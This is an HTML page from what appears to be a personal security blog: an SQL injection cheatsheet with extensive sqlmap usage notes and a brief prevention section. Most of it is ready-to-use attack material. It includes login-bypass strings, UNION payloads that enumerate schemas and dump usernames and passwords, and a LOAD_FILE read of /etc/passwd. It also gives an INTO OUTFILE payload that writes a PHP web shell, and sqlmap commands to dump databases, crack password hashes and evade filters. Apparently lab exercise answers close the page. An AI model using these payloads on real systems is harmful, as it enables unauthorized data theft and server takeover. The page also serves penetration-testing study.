@@ -1,0 +1,409 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Cheatsheets & Notes
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+	<div class="row page">
+		<!-- cols -->
+		
+					<div class="col-md-12">
+						
+
+							<!-- content -->
+							<div class="mypage">
+								
+
+										<h1 id="SQL-Injection-SQLi-Cheatsheet"><a href="#SQL-Injection-SQLi-Cheatsheet" class="headerlink" title="SQL Injection (SQLi) Cheatsheet"></a>SQL Injection (SQLi) Cheatsheet</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>SQL Injection (SQLi) allows an attacker to interfere with the queries that an application makes to its database. It can allow viewing data that is not normally retrievable, modifying data, or even executing administrative operations.</p>
+<hr>
+<h2 id="Types-of-SQLi"><a href="#Types-of-SQLi" class="headerlink" title="Types of SQLi"></a>Types of SQLi</h2><ol>
+<li><strong>In-Band (Classic)</strong>:<ul>
+<li><strong>Union-Based</strong>: Uses the <code>UNION</code> operator to combine the results of two or more SELECT statements into a single result set.</li>
+<li><strong>Error-Based</strong>: Forces the database to generate an error message that reveals information about the database structure.</li>
+</ul>
+</li>
+<li><strong>Inferential (Blind)</strong>:<ul>
+<li><strong>Boolean-Based</strong>: Sends queries to the database which force the application to return a different result depending on whether the query returns a TRUE or FALSE result.</li>
+<li><strong>Time-Based</strong>: Sends queries that pause the database for a specified period if the query is TRUE.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="Discovery"><a href="#Discovery" class="headerlink" title="Discovery"></a>Discovery</h2><h3 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h3><p>Try to bypass login forms by making the condition always true.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; -- -</span></span><br><span class="line"><span class="string">admin&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> #</span><br><span class="line">admin<span class="string">&#x27; OR 1=1 --</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Identifying-Injection-Points"><a href="#Identifying-Injection-Points" class="headerlink" title="Identifying Injection Points"></a>Identifying Injection Points</h3><ul>
+<li>Add <code>&#39;</code> or <code>&quot;</code> to parameters to see if it causes an error.</li>
+<li><strong>Boolean Test</strong>:<ul>
+<li><code>id=1 AND 1=1</code> (Should return normal page)</li>
+<li><code>id=1 AND 1=2</code> (Should return different&#x2F;empty page)</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="Exploitation-Union-Based"><a href="#Exploitation-Union-Based" class="headerlink" title="Exploitation (Union-Based)"></a>Exploitation (Union-Based)</h2><h3 id="1-Determine-Number-of-Columns"><a href="#1-Determine-Number-of-Columns" class="headerlink" title="1. Determine Number of Columns"></a>1. Determine Number of Columns</h3><p>Use <code>ORDER BY</code> to find the number of columns in the original query. Increment the number until you get an error.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ORDER BY 1 -- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2</span> <span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27; ORDER BY 3 -- -  &lt;-- Error means there are 2 columns</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Find-Displayable-Columns"><a href="#2-Find-Displayable-Columns" class="headerlink" title="2. Find Displayable Columns"></a>2. Find Displayable Columns</h3><p>Use <code>UNION SELECT</code> with the number of columns found. Check which numbers appear on the page.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1, 2, 3 -- -</span></span><br></pre></td></tr></table></figure>
+<p><em>Note: Ensure data types match. You can use <code>NULL</code> or strings if numbers fail.</em></p>
+<h3 id="3-Enumeration"><a href="#3-Enumeration" class="headerlink" title="3. Enumeration"></a>3. Enumeration</h3><p>Once you know which columns are displayed (e.g., column 2), inject functions there.</p>
+<table>
+<thead>
+<tr>
+<th align="left">Information</th>
+<th align="left">MySQL &#x2F; MariaDB</th>
+<th align="left">PostgreSQL</th>
+<th align="left">MSSQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Version</strong></td>
+<td align="left"><code>@@version</code></td>
+<td align="left"><code>version()</code></td>
+<td align="left"><code>@@version</code></td>
+</tr>
+<tr>
+<td align="left"><strong>Current User</strong></td>
+<td align="left"><code>user()</code>, <code>current_user()</code></td>
+<td align="left"><code>current_user</code></td>
+<td align="left"><code>user_name()</code></td>
+</tr>
+<tr>
+<td align="left"><strong>Database</strong></td>
+<td align="left"><code>database()</code></td>
+<td align="left"><code>current_database()</code></td>
+<td align="left"><code>db_name()</code></td>
+</tr>
+</tbody></table>
+<p><strong>Example:</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1, database(), user(), 4 -- -</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Database-Schema-Enumeration-MySQL"><a href="#4-Database-Schema-Enumeration-MySQL" class="headerlink" title="4. Database Schema Enumeration (MySQL)"></a>4. Database Schema Enumeration (MySQL)</h3><p><strong>List Databases:</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata -- -</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>List Tables (in current DB):</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema=database() -- -</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>List Columns (in specific table):</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="string">&#x27; -- -</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-Dumping-Data"><a href="#5-Dumping-Data" class="headerlink" title="5. Dumping Data"></a>5. Dumping Data</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1, username, password, 4 FROM users -- -</span></span><br></pre></td></tr></table></figure>
+<p><em>Tip: Concatenate columns if you only have one display slot:</em></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1, concat(username, &#x27;</span>:<span class="string">&#x27;, password), 3, 4 FROM users -- -</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Privilege-Escalation-RCE-MySQL"><a href="#Privilege-Escalation-RCE-MySQL" class="headerlink" title="Privilege Escalation &amp; RCE (MySQL)"></a>Privilege Escalation &amp; RCE (MySQL)</h2><h3 id="Check-Privileges"><a href="#Check-Privileges" class="headerlink" title="Check Privileges"></a>Check Privileges</h3><p>Check if the current user has <code>FILE</code> privilege (needed for reading&#x2F;writing files).</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=user() -- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, grantee, privilege_type, <span class="number">4</span> <span class="keyword">FROM</span> information_schema.user_privileges <span class="keyword">WHERE</span> grantee<span class="operator">=</span>&quot;&#x27;root&#x27;@&#x27;localhost&#x27;&quot; <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Reading-Files-LOAD-FILE"><a href="#Reading-Files-LOAD-FILE" class="headerlink" title="Reading Files (LOAD_FILE)"></a>Reading Files (<code>LOAD_FILE</code>)</h3><p>Read sensitive files like <code>/etc/passwd</code> or configuration files.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1, LOAD_FILE(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;), 3, 4 -- -</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Writing-Files-INTO-OUTFILE"><a href="#Writing-Files-INTO-OUTFILE" class="headerlink" title="Writing Files (INTO OUTFILE)"></a>Writing Files (<code>INTO OUTFILE</code>)</h3><p>Write a web shell to the web root (requires <code>secure_file_priv</code> to be empty and write permissions).</p>
+<ol>
+<li><strong>Check <code>secure_file_priv</code></strong>:<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name=&quot;secure_file_priv&quot; -- -</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>Write Shell</strong>:<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1, &quot;&lt;?php system($_GET[&#x27;</span>cmd<span class="string">&#x27;]); ?&gt;&quot;, 3, 4 INTO OUTFILE &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27; -- -</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<h2 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h2><ol>
+<li><strong>Parameterized Queries (Prepared Statements)</strong>: The most effective defense. Use placeholders (<code>?</code>) instead of concatenating input.<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE email = ?&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$email</span>]);</span><br></pre></td></tr></table></figure></li>
+<li><strong>Input Validation</strong>: Validate against a whitelist (e.g., only allow integers for IDs).</li>
+<li><strong>Least Privilege</strong>: Run the database service with a user that has minimum necessary privileges.</li>
+<li><strong>WAF</strong>: Use a Web Application Firewall to block common SQL injection patterns.</li>
+</ol>
+<h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">check the <span class="built_in">type</span> of vulnerability</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sqlmap -r req.txt</span>  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">check privileges</span></span><br><span class="line">sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dump db</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sqlmap -r req.txt --batch --dump</span> </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dump a table</span></span><br><span class="line">sqlmap -r sqli.txt --dbms=mysql --D tablename -T users --batch --dump</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dump col</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">read</span> file</span> </span><br><span class="line">sqlmap -r sqli.txt --dbms=mysql --dbs --batch --file-read=/etc/passwd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">write a file/webshell</span></span><br><span class="line">sqlmap -r sqli.txt --dbms=mysql --dbs --batch --file-write=/var/www/html/shell.php --filex (not sure of syntax)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqli.txt --dbms=mysql --dbs --batch</span><br><span class="line">sqlmap -r sqli.txt --dbms=mysql -D &lt;dbname&gt; --tables --batch</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="techniques"><a href="#techniques" class="headerlink" title="techniques"></a>techniques</h3><ul>
+<li><code>B</code>: Boolean-based blind</li>
+<li><code>E</code>: Error-based</li>
+<li><code>U</code>: Union query-based</li>
+<li><code>S</code>: Stacked queries</li>
+<li><code>T</code>: Time-based blind</li>
+<li><code>Q</code>: Inline queries</li>
+</ul>
+<h2 id="effective-cli-input-by-copying-http-request-as-Curl"><a href="#effective-cli-input-by-copying-http-request-as-Curl" class="headerlink" title="effective cli input by copying http request as Curl"></a>effective cli input by copying http request as Curl</h2><p><img src="/Pasted%20image%2020250613162532.png"></p>
+<p>By pasting the clipboard content (<code>Ctrl-V</code>) into the command line, and changing the original command <code>curl</code> to <code>sqlmap</code>, we are able to use SQLMap with the identical <code>curl</code> command:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap &#x27;http://www.example.com/?id=1&#x27; -H &#x27;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0&#x27; -H &#x27;Accept: image/webp,*/*&#x27; -H &#x27;Accept-Language: en-US,en;q=0.5&#x27; --compressed -H &#x27;Connection: keep-alive&#x27; -H &#x27;DNT: 1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options&#x2F;switches for automatic parameter finding (e.g. <code>--crawl</code>, <code>--forms</code> or <code>-g</code>).</p>
+<h2 id="request-methods"><a href="#request-methods" class="headerlink" title="request methods"></a>request methods</h2><p><code>POST</code> data, the <code>--data</code> flag can be used, as follows:</p>
+<p>Running SQLMap on an HTTP Request</p>
+<p>post request example:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap &#x27;http://www.example.com/&#x27; --data &#x27;uid=1&amp;name=test&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>if we have a clear indication that the parameter <code>uid</code> is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using <code>-p uid</code>. Otherwise, we could mark it inside the provided data with the usage of special marker <code>*</code> as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap &#x27;http://www.example.com/&#x27; --data &#x27;uid=1*&amp;name=test&#x27;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Full-HTTP-Requests-or-headers-only"><a href="#Full-HTTP-Requests-or-headers-only" class="headerlink" title="## Full HTTP Requests or headers only"></a>## Full HTTP Requests or headers only</h1><p>we need to specify a complex HTTP request with lots of different header values and an elongated POST body, we can use the <code>-r</code> flag with burp<br><img src="/Pasted%20image%2020250613163228.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r req.txt</span><br></pre></td></tr></table></figure>
+
+<p>Tip: similarly to the case with the ‘–data’ option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as ‘&#x2F;?id&#x3D;<code>*</code></p>
+<h1 id="custom-request"><a href="#custom-request" class="headerlink" title="custom request"></a>custom request</h1><p>request with cookie value:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap &lt;whatever&gt; --cookie=&#x27;PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>The same effect can be done with the usage of option <code>-H/--header</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap  -H=&#x27;Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>other switches can be used to manipulate headers  <code>--random-agent</code> changes the default<br><code>User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)</code>) which most protection solutions drop.<br>the <code>--mobile</code> switch can be used to imitate the smartphone by using that same header value.</p>
+<p> test the headers for the SQLi vulnerability<br>using <code>--cookie=&quot;id=1*&quot;</code></p>
+<p> specify HTTP method with <code>--method</code>, as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u www.target.com --data=&#x27;id=1&#x27; --method PUT</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap suppots json, xml bodies in req.txt file</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat req.txt</span><br><span class="line">HTTP / HTTP/1.0</span><br><span class="line">Host: www.example.com</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;data&quot;: [&#123;</span><br><span class="line">    &quot;type&quot;: &quot;articles&quot;,</span><br><span class="line">    &quot;id&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;attributes&quot;: &#123;</span><br><span class="line">      &quot;title&quot;: &quot;Ex</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r req.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="SWITCHES"><a href="#SWITCHES" class="headerlink" title="SWITCHES"></a>SWITCHES</h1><ul>
+<li>hostname of the vulnerable target (<code>--hostname</code>)</li>
+<li>Database version banner (switch <code>--banner</code>)</li>
+<li>Current user name (switch <code>--current-user</code>)</li>
+<li>Current database name (switch <code>--current-db</code>)</li>
+<li>Checking if the current user has DBA (administrator) rights (switch <code>--is-dba</code>)</li>
+<li>password hashes (<code>--passwords</code>)</li>
+</ul>
+<h2 id="Table-enumeration"><a href="#Table-enumeration" class="headerlink" title="Table enumeration"></a>Table enumeration</h2><ul>
+<li>–tables</li>
+<li>database <code>-D &lt;DBNAME&gt;</code><br>example:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb</span><br></pre></td></tr></table></figure>
+
+<p>dump format<br>–dump-format&#96; to HTML or SQLite</p>
+<p>HTML output<br><img src="/Pasted%20image%2020250614130736.png"></p>
+<h2 id="Column-Enumeration"><a href="#Column-Enumeration" class="headerlink" title="Column Enumeration"></a>Column Enumeration</h2><p>specify columns</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-C name,surname</span><br></pre></td></tr></table></figure>
+
+<p>narrow down row results </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--start=2 --stop=3</span><br><span class="line"></span><br><span class="line">| id | name   | surname |</span><br><span class="line">+----+--------+---------+</span><br><span class="line">| 2  | fluffy | bunny   |</span><br><span class="line">| 3  | wu     | ming    |</span><br></pre></td></tr></table></figure>
+
+<h3 id="conditional-enumeration"><a href="#conditional-enumeration" class="headerlink" title="conditional enumeration"></a>conditional enumeration</h3><p>If there is a requirement to retrieve certain rows based on a known <code>WHERE</code> condition (e.g. <code>name LIKE &#39;f%&#39;</code>), we can use the option <code>--where</code>, as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb --where=&quot;name LIKE &#x27;f%&#x27;&quot;</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line">Database: testdb</span><br><span class="line"></span><br><span class="line">Table: users</span><br><span class="line">[1 entry]</span><br><span class="line">+----+--------+---------+</span><br><span class="line">| id | name   | surname |</span><br><span class="line">+----+--------+---------+</span><br><span class="line">| 2  | fluffy | bunny   |</span><br></pre></td></tr></table></figure>
+<h2 id="Full-DB-enumeration"><a href="#Full-DB-enumeration" class="headerlink" title="Full DB enumeration"></a>Full DB enumeration</h2><p>a user is also advised to include the switch <code>--exclude-sysdbs</code> (e.g. <code>--dump-all --exclude-sysdbs</code>), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump-all --exclude-sysdbs </span><br></pre></td></tr></table></figure>
+
+<h1 id="schema-enumeration"><a href="#schema-enumeration" class="headerlink" title="schema enumeration"></a>schema enumeration</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.example.com/?id=1&quot; --schema</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line">Database: master</span><br><span class="line">Table: log</span><br><span class="line">[3 columns]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| date   | datetime     |</span><br><span class="line">| agent  | varchar(512) |</span><br><span class="line">| id     | int(11)      |</span><br><span class="line">+--------+--------------+</span><br></pre></td></tr></table></figure>
+
+<h1 id="sqlmap-search-feature"><a href="#sqlmap-search-feature" class="headerlink" title="sqlmap search feature"></a>sqlmap search feature</h1><p>we can search for databases, tables, and columns of interest, by using the <code>--search</code> option. This option enables us to search for identifier names by using the <code>LIKE</code> operator. For example, if we are looking for all of the table names containing the keyword <code>user</code>, we can run SQLMap as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --search -T user </span><br><span class="line"># searches for tables with user in it</span><br><span class="line"></span><br><span class="line"># --search -C pass </span><br><span class="line">searches for DBs,tables for columns with &#x27;pass&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="hashcracking"><a href="#hashcracking" class="headerlink" title="hashcracking"></a>hashcracking</h1><p>sqlmap can also crack hashes on the fly</p>
+<h3 id="dictionary-attacks"><a href="#dictionary-attacks" class="headerlink" title="dictionary attacks"></a>dictionary attacks</h3><p>involves comparing the hashes against a list of words, or a dictionary, to find a match.</p>
+<h3 id="extract-passwords-in-system-DBs-and-tables"><a href="#extract-passwords-in-system-DBs-and-tables" class="headerlink" title="extract   passwords in system DBs and tables"></a>extract   passwords in system DBs and tables</h3><p>(aka connection credentials)<br>attempt to dump the content of system tables containing database-specific credentials</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.example.com/?id=1&quot; --passwords --batch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[14:25:20] [INFO] starting dictionary-based cracking (mysql_passwd)</span><br><span class="line">[14:25:20] [INFO] starting 8 processes </span><br><span class="line">[14:25:26] [INFO] cracked password &#x27;testpass&#x27; for user &#x27;root&#x27;</span><br><span class="line">database management system users password hashes:</span><br><span class="line"></span><br><span class="line">[*] debian-sys-maint [1]:</span><br><span class="line">    password hash: *6B2C58EABD91C1776DA223B088B601604F898847</span><br><span class="line">[*] root [1]:</span><br><span class="line">    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29</span><br><span class="line">    clear-text password: testpass</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="full-enumeration"><a href="#full-enumeration" class="headerlink" title="full enumeration"></a>full enumeration</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># provide the entire enumeration details.</span><br><span class="line">-all --batch</span><br></pre></td></tr></table></figure>
+
+
+<p>What’s the name of the column containing “style” in it’s name? </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sqlmap -u &quot;http:&lt;target&gt;/case1.php?id=1*&quot; --search -C style --batch --no-cast </span><br></pre></td></tr></table></figure>
+
+
+<p>What’s the Kimberly user’s password? (Case #1)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sqlmap -u &quot;http://94.237.50.221:40349/case1.php?id=1*&quot; -T users -C name,password  --where=&quot;name like &#x27;k%&#x27;&quot;  --batch --dump</span><br></pre></td></tr></table></figure>
+											<div class="article-footer-copyright">
+
+</div>
+
+							</div>
+
+							
+									
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+-->
+											
+													
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+
+					
+
+
+			</div><!-- row -->
+
+			<!--
+ -->
+
+
+			<!-- Fixed TOC Container for hexo-toc.js -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  <a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script>
+<script src="/js/hexo-toc.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript">
+    (function ($) {
+      $('.fancybox').fancybox();
+    })(jQuery);
+  </script>
+  
+
+    
+      <script type="text/javascript">
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+          search_path = "search.xml";
+        }
+        var path = "/" + search_path;
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      </script>
+      
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
